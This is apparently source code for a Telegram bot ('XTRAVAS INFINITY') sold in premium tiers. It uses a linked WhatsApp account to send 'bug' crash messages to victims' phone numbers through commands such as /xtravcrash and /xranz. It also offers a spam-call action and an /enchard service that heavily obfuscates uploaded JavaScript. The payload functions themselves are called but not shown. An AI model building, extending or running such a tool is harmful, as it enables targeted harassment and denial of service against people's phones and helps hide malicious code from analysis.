❏━━━━｟ 𝗫𝗧𝗥𝗔𝗩𝗔𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 ｠━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃々 ʙᴏᴛ ɴᴀᴍᴇ : ${senderName}
┃々 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
┃々 ᴏɴʟɪɴᴇ : ${getOnlineDuration()}
┃々 sᴇɴᴅᴇʀ ɪᴅ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛

❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━━〖𝗠𝗘𝗡𝗨 𝗕𝗨𝗚〗 ━━━━━━━┓
┃ﾒ /xtravcrash 62xxx
┃ﾒ /xtravbeta 62xxx
┃ﾒ /xtravcurse 62xxx
┃ﾒ /xtravsystem 62xxx
┗━━━━━━━━━━━━━━━━━━━━━━━┛
❏━━━━━━━━━━━━━━━━━━━━━━━❏
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/zrvu0c.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "𝗢𝘄𝗡𝗲𝗥",
                      url: "https://t.me/abee1945"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/ownermenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  let ligma = `
❏━━━━｟ 𝗫𝗧𝗥𝗔𝗩𝗔𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 ｠━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃々 ʙᴏᴛ ɴᴀᴍᴇ : ${senderName}
┃々 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
┃々 ᴏɴʟɪɴᴇ : ${getOnlineDuration()}
┃々 sᴇɴᴅᴇʀ ɪᴅ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛

❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ━━━━━━┓
┃ﾒ /addbot <Num>
┃ﾒ /delbot <Num>
┃ﾒ /addprem <ID>
┃ﾒ /delprem <ID>
┃ﾒ /addowner <ID>
┃ﾒ /delowner <ID>
┃ﾒ /enchard <file.js>
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/zrvu0c.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "𝗢𝘄𝗡𝗲𝗥",
                      url: "https://t.me/abee1945"
                  }
              ]
          ]
      }
  });
});
//========================================================\\ 
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Pakai Code Negara Bego\nContoh Nih Njing: /addbot 62×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh Nih Njing : /addbot 62×××.");
}

await getSessions(bot, chatId, numberTarget)
});

// Logout Command
bot.onText(/\/delbot/, async (msg) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Bukan Owner Tolol!!!");
  }

  try {
    // Proses logout
    await logoutWhatsApp(); // Fungsi logout (lu bikin)
    return bot.sendMessage(chatId, "✅ Nomor Telah Di Logout Dari WhatsApp");
  } catch (error) {
    console.error(error);
    return bot.sendMessage(chatId, "❌ Gagal Mengganti Nomor");
  }
});
bot.onText(/\/xtravcrash(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /vampori 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampori 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim pesan awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await xtravcrash(formatedNumber);

    // Kirim pesan setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `
┏━━━━━━〣 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xtravbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛᴀɴ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/xtravbeta(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await xtravbeta(formatedNumber);
    await xtravui(formatedNumber);
    await xtravcrash(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/5vpccu.webp", {
        caption: `
┏━━━━━━〣 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xtravbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛᴀɴ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/xtrvcurse(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampios 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampios 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await xtravui(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `
┏━━━━━━〣 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xtravcurse
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛᴀɴ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/xranz(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Premium Users Only");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /vampblank 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampblank 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    await xtravblank(formatedNumber);
    await xtravui(formatedNumber);
    await xtravblank(formatedNumber);
    await xtravui(formatedNumber);
    await xtravblank(formatedNumber);
    await xtravui(formatedNumber);

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
        caption: `
┏━━━━━━〣 𝗜 𝗡 𝗙 𝗢 𝗥 𝗠 𝗔 𝗧 𝗜 𝗢 𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /xtravassystem
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 5 ᴍᴇɴɪᴛᴀɴ
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/enchard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Vampire Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀Xtravas Anak Alim舀" + "肀Xtravas Anak Alim舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireSukaNenen舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━〖𝗦𝘂𝗰𝗰𝗲𝘀𝘀〗━━━━━━❒
┃    - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 -
┃             -- 𝗫𝗧𝗥𝗔𝗩𝗔𝗦 𝗕𝗢𝗧 --
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});
bot.onText(/\/tqtq/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
  let ligma = `┏━━━〣 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 〣━━━┓
┃
┃ Putra (Developer)
┗━━━━━━━━━━━━━━━━━━━━━━┛`;
bot.sendPhoto(chatId, "https://files.catbox.moe/zrvu0c.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "𝗢𝘄𝗡𝗲𝗥",
                      url: "https://t.me/abee1945"
                  },
                  {
                      text: "𝗜𝗻𝗙𝗼 𝗫𝘁𝗥𝗮𝗩𝗮𝘀",
                      url: "https://t.me/infoscxtravas"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌  Lu Salah\nContoh Nih : /addowner 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌  Lu Salah\nContoh Nih : /addowner 62×××.");
  }

  if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      saveVip();
      console.log(`${senderId} Tambahkan ${userId} Menjadi Admin`)
      bot.sendMessage(chatId, `✅ Anda Ini ${userId} Sudah Mendapatkan Access Admin.`);
  } else {
      bot.sendMessage(chatId, `❌ Anda Ini ${userId} Sudah Menjadi Admin`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner");
  }
  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah\nContoh Nih : /delowner 62×××.");
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (adminUsers.includes(userId)) {
      adminUsers = adminUsers.filter(id => id !== userId);
      saveAdminUsers();
      saveVip();
      console.log(`${senderId} Dihapus ${userId} Oleh Admin`)
      bot.sendMessage(chatId, `Anda Ini ${userId} \nSudah Di Hapus Dari Admin.`);
  } else {
      bot.sendMessage(chatId, `❌ Anda Ini ${userId} Bukan Admin.`);
  }
});
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Atau Admin Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah\nContoh Nih : /addprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Lu Salah\nContoh Nih : /addprem 62×××.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `✅ bro Ini ${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ bro Ini ${userId} Sudah Menjadi Premium.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah\nContoh Nih : /delprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ Anda Ini ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Anda Ini ${userId} Bukan Lagi Premium.`);
  }
});

bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    // Definisi variabel yang belum ada
    let whatsappStatus = true; // Ganti sesuai logic di kode utama
    let getOnlineDuration = () => "1h 23m"; // Placeholder function

    try {
        if (action === "ownermenu") {
            let ligma = `
❏━━━━｟ 𝗫𝗧𝗥𝗔𝗩𝗔𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 ｠━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃々 ʙᴏᴛ ɴᴀᴍᴇ : ${senderName}
┃々 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
┃々 ᴏɴʟɪɴᴇ : ${getOnlineDuration()}
┃々 sᴇɴᴅᴇʀ ɪᴅ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛

❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ━━━━━━┓
┃ﾒ /addbot <Num>
┃ﾒ /delbot <Num>
┃ﾒ /addprem <ID>
┃ﾒ /delprem <ID>
┃ﾒ /addowner <ID>
┃ﾒ /delowner <ID>
┃ﾒ /enchard <file.js>
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
            `;
            await bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
                caption: ligma,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "𝗢𝘄𝗡𝗲𝗥", url: "https://t.me/erbustrash" }]
                    ]
                }
            });

        } else if (action === "bugmenu") {
            let message = `❏━━━━｟ 𝗫𝗧𝗥𝗔𝗩𝗔𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 ｠━━━━❏
┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃々 ʙᴏᴛ ɴᴀᴍᴇ : ${senderName}
┃々 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @abee1945
┃々 ᴏɴʟɪɴᴇ : ${getOnlineDuration()}
┃々 sᴇɴᴅᴇʀ ɪᴅ : ${senderId}
┗━━━━━━━━━━━━━━━━━━━━━━━┛

❏━━━━━━━━━━━━━━━━━━━━━━━❏
┏━━━━━━━〖𝗠𝗘𝗡𝗨 𝗕𝗨𝗚〗 ━━━━━━━┓
┃ﾒ /xtravcrash 62xxx
┃ﾒ /xtravbeta 62xxx
┃ﾒ /xtravcurse 62xxx
┃ﾒ /xtravsystem 62xxx
┗━━━━━━━━━━━━━━━━━━━━━━━┛
❏━━━━━━━━━━━━━━━━━━━━━━━❏
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/geltze.jpg", {
                caption: message, // Sebelumnya salah pake `ligma`
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "𝗢𝘄𝗡𝗲𝗥", url: "https://t.me/abee1945" }]
                    ]
                }
            });

        } else if (action === "tqtq") {
            await bot.sendMessage(chatId, `┏━━━〣 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 〣━━━┓
┃
┃ Putra (Developer)
┗━━━━━━━━━━━━━━━━━━━━━━┛`);

        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);

        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        // Hapus loading di button
        await bot.answerCallbackQuery(callbackQuery.id);

    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp()